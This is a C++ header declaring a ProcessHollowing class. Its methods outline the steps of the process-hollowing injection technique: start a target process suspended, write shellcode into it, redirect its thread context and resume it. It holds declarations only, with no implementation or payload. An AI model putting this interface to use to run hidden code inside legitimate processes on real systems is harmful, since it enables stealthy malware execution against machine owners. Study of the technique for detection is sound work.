#pragma once
#include <windows.h>
#include <vector>
#include <string>
#include <iostream>

class ProcessHollowing {
public:
	ProcessHollowing();

	PROCESS_INFORMATION CreateSuspendedProcess(const std::string& targetProcess);
	CONTEXT GetProcessContext(HANDLE hThread);
	PVOID WriteShellcodeToProcess(HANDLE hProcess, const std::vector<unsigned char>& shellcode);
	VOID SetContextAndResumeProcess(HANDLE hProcess, HANDLE hThread, CONTEXT& ctx, PVOID shellcodeAddress);
	VOID HollowProcess(const std::string& targetProcess, const std::vector<unsigned char>& shellcode);
};
